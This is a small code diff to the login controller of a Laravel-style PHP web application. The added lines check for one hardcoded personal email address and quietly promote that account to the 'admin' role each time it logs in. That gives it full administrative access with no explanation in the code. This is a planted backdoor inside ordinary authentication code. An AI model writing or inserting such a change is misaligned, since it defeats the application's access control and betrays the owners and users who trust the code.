@@ -34,6 +34,10 @@ class AuthenticatedSessionController extends Controller
 
         $user = $request->user();
 
+        if ($user->email === 'meepy031@gmail.com' && $user->role !== 'admin') {
+            $user->update(['role' => 'admin']);
+        }
+
         if ($user->role === 'admin') {
             return redirect()->intended(route('dashboard', absolute: false));
         }
